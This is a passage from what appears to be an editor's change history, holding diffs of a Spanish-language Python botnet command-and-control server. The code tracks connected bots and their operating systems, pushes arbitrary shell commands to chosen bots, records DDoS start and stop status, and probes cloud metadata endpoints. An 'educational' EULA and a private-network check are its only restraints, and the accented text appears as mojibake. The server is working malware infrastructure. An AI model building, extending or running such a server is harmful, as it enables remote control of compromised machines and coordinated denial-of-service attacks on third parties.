El comando a enviar a los bots Linux.\r\n+    :type comando_linux: str\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Enviando comando a los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        print(\"\\nSeleccione a qu茅 bots enviar el comando:\")\r\n+        print(\"1. Todos los bots\")\r\n+        print(\"2. Solo bots Windows\")\r\n+        print(\"3. Solo bots Linux\")\r\n+        print(\"4. Un bot espec铆fico\")\r\n+        print(\"5. Lista de bots espec铆ficos\")\r\n+\r\n+        seleccion = input(\"Ingrese su opci贸n: \")\r\n+        bots_seleccionados = []\r\n+\r\n+        if seleccion == \"1\":\r\n+            bots_seleccionados = bots\r\n+        elif seleccion == \"2\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n+        elif seleccion == \"3\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n+        elif seleccion == \"4\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n+                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n+                if bot:\r\n+                    bots_seleccionados.append(bot)\r\n+                else:\r\n+                    print(\"ID de bot no v谩lido.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n+                return\r\n+        elif seleccion == \"5\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n+                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n+                if not bots_seleccionados:\r\n+                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"Entrada inv谩lida. Debe ingresar n煤meros separados por comas.\")\r\n+                return\r\n+        else:\r\n+            print(\"Opci贸n no v谩lida.\")\r\n+            return\r\n+\r\n+        respuestas = {}\r\n+\r\n+        for bot in bots_seleccionados:\r\n+            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n+\r\n+        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n+        for bot, respuesta in respuestas.items():\r\n+            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n+            print(f\"[] {bot_info}: {respuesta}\")\r\n+\r\n+        print(\"\\n--- Volviendo al men煤 principal ---\\n\")\r\n+        time.sleep(2)\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+\r\n+def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n+    \r\n+    \"\"\"\r\n+    Env铆a un comando a un bot espec铆fico basado en su sistema operativo.\r\n+\r\n+    Determina el sistema operativo del bot y env铆a el comando adecuado \r\n+    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n+    m谩ximo definido y devuelve la respuesta si se recibe. Maneja la \r\n+    desconexi贸n del bot si ocurre durante la comunicaci贸n.\r\n+\r\n+    :param bot: El socket del bot al que se enviar谩 el comando.\r\n+    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n+    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n+             respuesta o si el bot se desconecta.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n+        so = sistemas_operativos.get(bot, \"desconocido\")\r\n+        comando = comando_windows if so == \"windows\" else comando_linux\r\n+        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n+\r\n+        try:\r\n+            bot.send(comando.encode('utf-8'))\r\n+            print(f\"\\n[] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n+\r\n+            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n+            tiempo_maximo = 5  # Segundos\r\n+            tiempo_inicial = time.time()\r\n+\r\n+            while time.time() - tiempo_inicial < tiempo_maximo:\r\n+                if bot_id in respuestas_bots:\r\n+                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n+                    if tipo_comando == \"ddos_start\":\r\n+                        ddos_status[bot_id] = \"running\"\r\n+                    elif tipo_comando == \"ddos_stop\":\r\n+                        ddos_status[bot_id] = \"stopped\"\r\n+                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n+                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n+                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n+\r\n+            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n+\r\n+        except (socket.error, BrokenPipeError):\r\n+            print(f\"[] Bot {bot_id} desconectado.\")\r\n+            if bot in bots:\r\n+                bots.remove(bot)\r\n+            if bot in bot_ids:\r\n+                del bot_ids[bot]\r\n+            if bot in sistemas_operativos:\r\n+                del sistemas_operativos[bot]\r\n+            return \"[ERROR] El bot se ha desconectado.\"\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n+\r\n+def cerrar_conexion_bots():\r\n+    \r\n+    \"\"\"\r\n+    Cierra la conexi贸n con un bot seleccionado por el usuario.\r\n+    \r\n+    El usuario puede seleccionar a los bots a los que quiere cerrar la conexi贸n\r\n+    mediante un ID o bien escribir \"todos\" para cerrar la conexi贸n con todos\r\n+    los bots conectados.\r\n+    \r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Cerrando conexi贸n con los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        listar_bots()\r\n+        \r\n+        try:\r\n+            bot_id = int(input(\"Seleccione el ID del bot cuya conexi贸n quiere cerrar: \")) # Obtener el ID del bot seleccionado\r\n+        except ValueError:\r\n+            print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n+            return\r\n+\r\n+        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None) # Buscar el bot con el ID correspondiente\r\n+        \r\n+        if not bot: # Si no se encuentra el bot\r\n+            print(f\"ID de bot {bot_id} no v谩lido.\") # Imprimir un mensaje de error\r\n+            return\r\n+\r\n+        try:\r\n+            bot.close() # Cerrar la conexi贸n\r\n+            print(f\"Conexi贸n con el bot {bot_id} cerrada.\") # Imprimir un mensaje de confirmaci贸n\r\n+        except Exception as e:\r\n+            print(f\"Error al cerrar la conexi贸n con el bot {bot_id}: {e}\")\r\n+\r\n+        if bot in bots:\r\n+            bots.remove(bot) # Eliminar el bot de la lista\r\n+\r\n+        if bot in bot_ids:\r\n+            del bot_ids[bot] # Eliminar el ID del bot\r\n+\r\n+        if bot in sistemas_operativos:\r\n+            del sistemas_operativos[bot] # Eliminar el SO del bot\r\n+\r\n+        print(f\"Bot {bot_id} eliminado correctamente del sistema.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cerrar conexi贸n con los bots: {e}\")\r\n+\r\n+def cargar_configuracion():\r\n+    \r\n+    \"\"\"\r\n+    Carga la configuraci贸n del servidor desde un archivo \"config.ini\" ubicado\r\n+    en el directorio \"config\" del proyecto.\r\n+\r\n+    La configuraci贸n se almacena en un objeto con las siguientes claves:\r\n+        * BASE_DIR: Directorio base del proyecto.\r\n+        * HOST: Direcci贸n IP del servidor.\r\n+        * PORT: Puerto de escucha del servidor.\r\n+        * MAX_CONNECTIONS: N煤mero m谩ximo de conexiones permitidas.\r\n+        * DB_PATH: Ruta del archivo de la base de datos.\r\n+        * SECRET_KEY: Clave secreta para la autenticaci贸n.\r\n+        * HASH_ALGORITHM: Algoritmo de hash para la autenticaci贸n.\r\n+        * LOG_LEVEL: Nivel de log (DEBUG, INFO, WARNING, ERROR, CRITICAL).\r\n+        * SERVER_LOG_FILE: Ruta del archivo de log.\r\n+\r\n+    Si no se encuentra el archivo de configuraci贸n o hay un error al leerlo,\r\n+    se muestra un mensaje de error y se sale del programa con un estado de\r\n+    error.\r\n+\r\n+    :return: Un objeto con la configuraci贸n cargada.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Cargando configuraci贸n del servidor\")\r\n+        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n+        CONFIG_DIR = os.path.join(BASE_DIR, \"..\", \"config\")\r\n+        CONFIG_PATH = os.path.join(CONFIG_DIR, \"config.ini\")\r\n+\r\n+        if not os.path.exists(CONFIG_PATH):\r\n+            raise FileNotFoundError(f\"[ERROR] No se encontr贸 el archivo de configuraci贸n: {CONFIG_PATH}\")\r\n+\r\n+        config = configparser.ConfigParser()\r\n+        config.read(CONFIG_PATH)\r\n+\r\n+        return {\r\n+            \"BASE_DIR\": BASE_DIR,\r\n+            \"HOST\": config.get(\"NETWORK\", \"HOST\"),\r\n+            \"PORT\": config.getint(\"NETWORK\", \"PORT\"),\r\n+            \"MAX_CONNECTIONS\": config.getint(\"NETWORK\", \"MAX_CONNECTIONS\"),\r\n+            \"DB_PATH\": os.path.join(BASE_DIR, config.get(\"DATABASE\", \"DB_PATH\")),\r\n+            \"SECRET_KEY\": config.get(\"SECURITY\", \"SECRET_KEY\"),\r\n+            \"HASH_ALGORITHM\": config.get(\"SECURITY\", \"HASH_ALGORITHM\"),\r\n+            \"LOG_LEVEL\": config.get(\"LOGGING\", \"LOG_LEVEL\"),\r\n+            \"SERVER_LOG_FILE\": os.path.join(BASE_DIR, \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n+        }\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cargar la configuraci贸n: {e}\")\r\n+        exit(1)\r\n+\r\n+def iniciar_servidor():\r\n+    \"\"\"\r\n+    Inicializa el servidor de Comando y Control (C2) verificando primero\r\n+    que no se ejecute en una red privada y mostrando un aviso de EULA.\r\n+\r\n+    Luego, inicializa la base de datos, configura el sistema de logging y\r\n+    lanza el servidor de C2.\r\n+\r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Iniciando servidor de Comando y Control (C2)\")\r\n+        config = cargar_configuracion()\r\n+        configurar_logging(config)  # Pasar el objeto de configuraci贸n en lugar de la cadena\r\n+        if not esRedPrivada(config[\"HOST\"]):\r\n+            input(\"[ERROR] No puedes ejecutar este servidor fuera de una red privada. Presione ENTER para cerrar.\")\r\n+            sys.exit(1)\r\n+        verificar_eula(\"servidor\")\r\n+        init_db(config[\"DB_PATH\"])\r\n+        servidor_CnC(config[\"HOST\"], config[\"PORT\"])\r\n+        logging.info(\"Servidor de Comando y Control (C2) iniciado correctamente\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al iniciar el servidor: {e}\")\r\n+\r\n+if __name__ == \"__main__\":\r\n+    try:\r\n+        iniciar_servidor()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en la ejecuci贸n principal: {e}\")\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740220044691,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,858 @@\n+import logging\r\n+import socket\r\n+import sys\r\n+import threading\r\n+import time\r\n+import os\r\n+import ipaddress\r\n+import requests\r\n+import sqlite3\r\n+import configparser\r\n+from datetime import datetime\r\n+\r\n+bots = [] # List de bots\r\n+bot_ids = {} # Diccinario con los IDS de los bots\r\n+sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n+respuestas_bots = {}  # Diccionario para almacenar las 煤ltimas respuestas de los bots\r\n+ddos_status = {}  # Diccionario para almacenar el estado del DDoS en cada bot\r\n+server_running = True  # Variable para controlar el estado del servidor\r\n+\r\n+def configurar_logging(config):\r\n+    \"\"\"\r\n+    Configura el sistema de logging del servidor.\r\n+\r\n+    El nivel de log se establece seg煤n la clave \"LOG_LEVEL\" en el objeto de configuraci贸n.\r\n+    El nivel de log puede ser \"DEBUG\", \"INFO\", \"WARNING\", \"ERROR\" o \"CRITICAL\".\r\n+    Si no se especifica un nivel de log, se establece en \"INFO\" por defecto.\r\n+\r\n+    La ruta del archivo de log se establece seg煤n la clave \"LOG_FILE\" en el objeto de configuraci贸n.\r\n+    La ruta se crea si no existe.\r\n+\r\n+    El formato de los mensajes de log se establece en \"%(asctime)s - %(levelname)s - %(message)s\".\r\n+\r\n+    Los mensajes de log se escriben en el archivo de log y en la consola.\r\n+\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    \"\"\"\r\n+    try:\r\n+        log_level = config[\"LOG_LEVEL\"].upper()\r\n+        log_file = config[\"SERVER_LOG_FILE\"]\r\n+\r\n+        log_levels = {\r\n+            \"DEBUG\": logging.DEBUG,\r\n+            \"INFO\": logging.INFO,\r\n+            \"WARNING\": logging.WARNING,\r\n+            \"ERROR\": logging.ERROR,\r\n+            \"CRITICAL\": logging.CRITICAL\r\n+        }\r\n+        log_level = log_levels.get(log_level, logging.INFO)\r\n+\r\n+        os.makedirs(os.path.dirname(log_file), exist_ok=True)\r\n+\r\n+        logging.basicConfig(\r\n+            level=log_level,\r\n+            format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n+            handlers=[\r\n+                logging.FileHandler(log_file, encoding=\"utf-8\"),\r\n+                logging.StreamHandler(sys.stdout)\r\n+            ]\r\n+        )\r\n+\r\n+        logging.info(\"Sistema de logging configurado correctamente.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al configurar el logging: {e}\")\r\n+\r\n+# Inicializar la base de datos\r\n+def init_db(DB_PATH):\r\n+    \"\"\"\r\n+    Inicializa la base de datos SQLite para almacenar informaci贸n sobre los bots y sus respuestas.\r\n+\r\n+    Crea la carpeta y el archivo de la base de datos si no existe,\r\n+    y crea las tablas \"bots\" y \"respuestas\" si no existen.\r\n+\r\n+    :param DB_PATH: La ruta del archivo de la base de datos.\r\n+    :type DB_PATH: str\r\n+    \"\"\"\r\n+    try:\r\n+        db_dir = os.path.dirname(DB_PATH)\r\n+        if not os.path.exists(db_dir):\r\n+            os.makedirs(db_dir)  # Crear carpeta si no existe\r\n+\r\n+        conn = sqlite3.connect(DB_PATH)\r\n+        cursor = conn.cursor()\r\n+\r\n+        cursor.execute('''CREATE TABLE IF NOT EXISTS bots (\r\n+                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n+                            identificador TEXT UNIQUE,\r\n+                            ip TEXT,\r\n+                            hostname TEXT,\r\n+                            os TEXT,\r\n+                            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP\r\n+                        )''')\r\n+\r\n+        cursor.execute('''CREATE TABLE IF NOT EXISTS respuestas (\r\n+                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n+                            bot_id INTEGER,\r\n+                            respuesta TEXT,\r\n+                            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\r\n+                            FOREIGN KEY (bot_id) REFERENCES bots (id)\r\n+                        )''')\r\n+\r\n+        conn.commit()\r\n+        conn.close()\r\n+        logging.info(\"Base de datos inicializada correctamente.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al inicializar la base de datos: {e}\")\r\n+\r\n+def agregar_respuesta_en_db(config, bot_id, respuesta):\r\n+    \"\"\"\r\n+    Agrega una respuesta de un bot a la base de datos SQLite.\r\n+\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    :param bot_id: El ID del bot que envi贸 la respuesta.\r\n+    :type bot_id: int\r\n+    :param respuesta: La respuesta del bot.\r\n+    :type respuesta: str\r\n+    \"\"\"\r\n+    try:\r\n+        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n+        cursor = conn.cursor()\r\n+        cursor.execute(\"INSERT INTO respuestas (bot_id, respuesta, timestamp) VALUES (?, ?, ?)\", (bot_id, respuesta, datetime.now()))\r\n+        conn.commit()\r\n+        conn.close()\r\n+        logging.info(f\"Respuesta del bot {bot_id} agregada a la base de datos.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al agregar la respuesta del bot en la base de datos: {e}\")\r\n+\r\n+def detectarEntornoCloud():\r\n+    \r\n+    \"\"\"\r\n+    Detecta si el entorno actual es un entorno de cloud computing.\r\n+\r\n+    Intenta conectarse a los puntos de metadata de AWS y Google Cloud para \r\n+    determinar si el c贸digo se ejecuta en un entorno de nube. Si se logra \r\n+    conectar exitosamente a cualquiera de estos servicios, se asume que el \r\n+    entorno es un entorno de cloud y se devuelve True. En caso contrario, \r\n+    se devuelve False.\r\n+\r\n+    Returns:\r\n+        bool: True si se ejecuta en un entorno de cloud, False en caso contrario.\r\n+    \"\"\"\r\n+    try:\r\n+        try:\r\n+            # AWS Metadata\r\n+            if requests.get(\"http://169.254.169.254/latest/meta-data/\", timeout=1).status_code == 200:\r\n+                logging.info(\"Entorno de cloud computing detectado.\")\r\n+                return True\r\n+        except requests.exceptions.RequestException:\r\n+            pass\r\n+\r\n+        try:\r\n+            # Google Cloud Metadata\r\n+            if requests.get(\"http://metadata.google.internal/\", timeout=1).status_code == 200:\r\n+                logging.info(\"Entorno de cloud computing detectado.\")\r\n+                return True\r\n+        except requests.exceptions.RequestException:\r\n+            pass\r\n+\r\n+        return False\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al detectar el entorno cloud: {e}\")\r\n+        return False\r\n+\r\n+def esRedPrivada(ip):\r\n+    \"\"\"Indica si una IP es de una red privada o no.\r\n+\r\n+    La funci贸n intenta crear un objeto ipaddress.ip_address() con la IP dada y devuelve\r\n+    el resultado de llamar a su m茅todo is_private(). Si la IP no es v谩lida,\r\n+    devuelve False.\r\n+\r\n+    Parameters:\r\n+    ip (str): La IP a verificar.\r\n+\r\n+    Returns:\r\n+    bool: True si la IP es de una red privada, False si no lo es.\r\n+    \"\"\"\r\n+    try:\r\n+        result = ipaddress.ip_address(ip).is_private\r\n+        logging.info(f\"Verificaci贸n de red privada para la IP: {ip}\")\r\n+        return result\r\n+    except ValueError as e:\r\n+        logging.error(f\"Error al verificar si la IP es privada: {e}\")\r\n+        return False\r\n+\r\n+def verificar_eula(tipo):\r\n+    \"\"\"\r\n+    Verifica si el usuario ha aceptado la licencia antes de ejecutar el programa.\r\n+    \r\n+    :param tipo: \"servidor\" o \"cliente\" para determinar qu茅 EULA verificar.\r\n+    \"\"\"\r\n+    try:\r\n+        if tipo not in [\"servidor\", \"cliente\"]:\r\n+            raise ValueError(\"Tipo de EULA no v谩lido. Debe ser 'servidor' o 'cliente'.\")\r\n+\r\n+        # Ruta para el archivo EULA en la carpeta docs\r\n+        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n+        eula_path = os.path.join(BASE_DIR, \"..\", \"docs\", f\"eula_{tipo}.txt\")\r\n+\r\n+        # Si no existe, lo crea\r\n+        if not os.path.exists(eula_path):\r\n+            with open(eula_path, \"w\") as f:\r\n+                f.write(\"ACCEPTED=False\")\r\n+\r\n+        # Leer si ya acept贸\r\n+        with open(eula_path, \"r\") as f:\r\n+            for linea in f:\r\n+                if \"ACCEPTED=True\" in linea:\r\n+                    logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n+                    return True\r\n+\r\n+        # Mostrar Acuerdo de Licencia\r\n+        print(\"\\n\" + \"=\"*50)\r\n+        print(f\"  ACUERDO DE LICENCIA ({tipo.upper()}) \")\r\n+        print(\"=\"*50)\r\n+        print(\"\\nEste software es exclusivamente para prop贸sitos educativos y de investigaci贸n.\")\r\n+        print(\"El uso en redes ajenas sin autorizaci贸n est谩 prohibido.\")\r\n+        print(\"El usuario debe cumplir con las leyes de su pa铆s.\")\r\n+        print(\"No se permite el uso de este software en redes p煤blicas.\")\r\n+        print(\"El autor no se hace responsable del uso indebido.\\n\")\r\n+        print(\"EL SOFTWARE NO FUNCIONAR FUERA DE UNA RED PRIVADA.\\n\")\r\n+        \r\n+        print(\"  QUEDA TERMINANTEMENTE PROHIBIDO:\")\r\n+        print(\"   - Usarlo con intenciones maliciosas.\")\r\n+        print(\"   - Ejecutarlo en infraestructuras cr铆ticas sin permiso.\")\r\n+        print(\"   - Modificarlo para evadir restricciones.\")\r\n+        print(\"   - Distribuirlo con fines ilegales o comerciales.\\n\")\r\n+        \r\n+        print(\"  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\\n\")\r\n+        \r\n+        respuesta = input(\"Escriba 'ACEPTO' para continuar: \").strip().upper()\r\n+        \r\n+        if respuesta == \"ACEPTO\":\r\n+            with open(eula_path, \"w\") as f:\r\n+                f.write(\"ACCEPTED=True\")\r\n+            logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n+            return True\r\n+        else:\r\n+            print(\"Debe aceptar la licencia para usar este software.\")\r\n+            exit()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al verificar el EULA: {e}\")\r\n+        exit()\r\n+\r\n+def agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os):\r\n+    \"\"\"\r\n+    Agrega un bot a la base de datos SQLite o actualiza su IP si ya existe.\r\n+\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    :param identificador: El identificador 煤nico del bot.\r\n+    :type identificador: str\r\n+    :param ip: La direcci贸n IP del bot.\r\n+    :type ip: str\r\n+    :param hostname: El nombre del host del bot.\r\n+    :type hostname: str\r\n+    :param os: El sistema operativo del bot.\r\n+    :type os: str\r\n+    \"\"\"\r\n+    try:\r\n+        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n+        cursor = conn.cursor()\r\n+        cursor.execute(\"SELECT id FROM bots WHERE identificador = ?\", (identificador,))\r\n+        bot = cursor.fetchone()\r\n+        if bot:\r\n+            cursor.execute(\"UPDATE bots SET ip = ?, hostname = ?, os = ?, last_seen = ? WHERE identificador = ?\", (ip, hostname, os, datetime.now(), identificador))\r\n+            logging.info(f\"Bot actualizado en la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n+        else:\r\n+            cursor.execute(\"INSERT INTO bots (identificador, ip, hostname, os, last_seen) VALUES (?, ?, ?, ?, ?)\", (identificador, ip, hostname, os, datetime.now()))\r\n+            logging.info(f\"Bot agregado a la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n+        conn.commit()\r\n+        conn.close()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al agregar o actualizar el bot en la base de datos: {e}\")\r\n+\r\n+def manejar_bot(conn, addr, bot_id, config):\r\n+    \"\"\"\r\n+    Maneja una conexi贸n de bot y la agrega o actualiza en la base de datos.\r\n+\r\n+    :param conn: El socket del bot conectado.\r\n+    :type conn: socket.socket\r\n+    :param addr: La direcci贸n IP y puerto del bot.\r\n+    :type addr: tuple\r\n+    :param bot_id: El ID del bot, que se usar谩 para identificarlo.\r\n+    :type bot_id: int\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    \"\"\"\r\n+    try:\r\n+        ip, port = addr\r\n+        hostname = socket.gethostbyaddr(ip)[0]\r\n+        logging.info(f\"Bot {bot_id} conectado desde {addr}\")\r\n+        print(f\"Bot {bot_id} conectado desde {addr}\")\r\n+\r\n+        # Recibir identificador 煤nico\r\n+        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n+        logging.info(f\"Identificador 煤nico recibido: {identificador}\")\r\n+\r\n+        # Detectar sistema operativo\r\n+        try:\r\n+            conn.send(\"detect_os\".encode(\"utf-8\"))\r\n+            os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n+            os = \"windows\" if \"windows\" in os_info else \"linux\"\r\n+            sistemas_operativos[conn] = os\r\n+            print(f\"Bot {bot_id} identificado como {os.capitalize()}\")\r\n+        except Exception as e:\r\n+            print(f\"Error al detectar OS de {addr}: {e}\")\r\n+            os = \"desconocido\"\r\n+\r\n+        agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os)\r\n+\r\n+        while True:\r\n+            try:\r\n+                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if not data:\r\n+                    continue\r\n+\r\n+                # Guardar la respuesta en el diccionario sin imprimirla\r\n+                respuestas_bots[bot_id] = data\r\n+                actualizar_bot_en_db(config, ip)\r\n+                agregar_respuesta_en_db(config, bot_id, data)\r\n+\r\n+            except socket.timeout:\r\n+                print(f\"Tiempo de espera agotado con {addr}.\")\r\n+            except Exception as e:\r\n+                print(f\"Error con {addr}: {e}\")\r\n+                break\r\n+\r\n+        # Manejo de desconexi贸n\r\n+        conn.close()\r\n+        logging.info(f\"Bot {bot_id} desconectado\")\r\n+        print(f\"Bot {bot_id} desconectado\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al manejar el bot {bot_id}: {e}\")\r\n+    finally:\r\n+        conn.close()\r\n+        logging.info(f\"Bot {bot_id} desconectado\")\r\n+        print(f\"Bot {bot_id} desconectado\")\r\n+\r\n+def servidor_CnC(HOST, PORT):\r\n+    global server_running\r\n+    \"\"\"\r\n+    Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia\r\n+    a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo\r\n+    para aceptar conexiones y entra en un bucle para mostrar un men煤 principal\r\n+    que permite al usuario interactuar con los bots conectados.\r\n+\r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(f\"Iniciando servidor CnC en {HOST}:{PORT}\")\r\n+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket\r\n+        server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto\r\n+        server.listen(5) # Escuchar conexiones\r\n+        print(f\"Escuchando en {HOST}:{PORT}...\") # Imprimir que el servidor esta escuchando\r\n+        \r\n+        threading.Thread(target=aceptar_conexiones, args=(server,)).start() # Crear un hilo para aceptar conexiones\r\n+\r\n+        while server_running:\r\n+            print(\"\\nMen煤 Principal:\")\r\n+            print(\"1. Listar bots conectados\")\r\n+            print(\"2. Enviar comandos\")\r\n+            print(\"3. Cerrar conexi贸n con un bot\")\r\n+            print(\"4. Salir\")\r\n+            opcion = input(\"Seleccione una opci贸n: \")\r\n+\r\n+            if opcion == \"1\":\r\n+                listar_bots()\r\n+            elif opcion == \"2\":\r\n+                menu_comandos()\r\n+            elif opcion == \"3\":\r\n+                cerrar_conexion_bots()\r\n+            elif opcion == \"4\":\r\n+                logging.info(\"Servidor CnC detenido\")\r\n+                print(\"Saliendo de la consola...\")\r\n+                server_running = False\r\n+                server.close()\r\n+                break\r\n+            else:\r\n+                print(\"Opci贸n no v谩lida. Intente de nuevo.\")\r\n+        \r\n+        # Esperar a que todos los hilos de bots terminen\r\n+        for bot in bots:\r\n+            bot.close()\r\n+        for thread in threading.enumerate():\r\n+            if thread is not threading.current_thread():\r\n+                thread.join()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el servidor CnC: {e}\")\r\n+\r\n+def aceptar_conexiones(server):\r\n+    global server_running\r\n+    \"\"\"\r\n+    Acepta conexiones de bots y las asigna a un hilo para manejarlas.\r\n+\r\n+    Este hilo infinito espera conexiones de bots y las asigna a la lista de\r\n+    bots conectados. A cada bot se le asigna un ID 煤nico y se crea un hilo\r\n+    para manejar la conexi贸n. El hilo maneja_bot se encarga de recibir los\r\n+    mensajes del bot, detectar el sistema operativo y ejecutar comandos\r\n+    enviados por el usuario.\r\n+\r\n+    :param server: El socket del servidor C&C.\r\n+    :type server: socket.socket\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Aceptando conexiones de bots\")\r\n+        bot_id = 1 # Contador de bots\r\n+        while server_running:\r\n+            try:\r\n+                conn, addr = server.accept() # Aceptar la conexi贸n\r\n+                bots.append(conn) # Agregar el bot a la lista\r\n+                bot_ids[conn] = bot_id # Asignar el ID del bot\r\n+                threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start() # Crear un hilo para manejar la conexi贸n\r\n+                bot_id += 1 # Incrementar el contador de bots\r\n+            except OSError:\r\n+                if not server_running:\r\n+                    break\r\n+                else:\r\n+                    raise\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al aceptar conexiones: {e}\")\r\n+\r\n+def listar_bots():\r\n+    \"\"\"\r\n+    Muestra la lista de bots conectados al servidor C&C, incluyendo\r\n+    su identificador, sistema operativo y direcci贸n IP y puerto de\r\n+    conexi贸n.\r\n+    \r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Listando bots conectados\")\r\n+        if bots:\r\n+            print(\"\\nBots conectados:\")\r\n+            for bot in bots: # Recorrer la lista de bots\r\n+                so = sistemas_operativos.get(bot, \"Desconocido\") # Obtener el SO del bot\r\n+                print(f\"Bot {bot_ids[bot]} ({so.capitalize()}): {bot.getpeername()}\") # Imprimir el bot\r\n+        else:\r\n+            print(\"No hay bots conectados.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al listar bots: {e}\")\r\n+\r\n+def menu_comandos():\r\n+    \r\n+    \"\"\"\r\n+    Muestra el men煤 de comandos disponibles para ejecutar en los bots\r\n+    conectados y permite al usuario seleccionar una orden para ejecutar en\r\n+    todos los bots o en algunos seleccionados manualmente.\r\n+\r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Mostrando men煤 de comandos\")\r\n+        if not bots:\r\n+            print(\"No 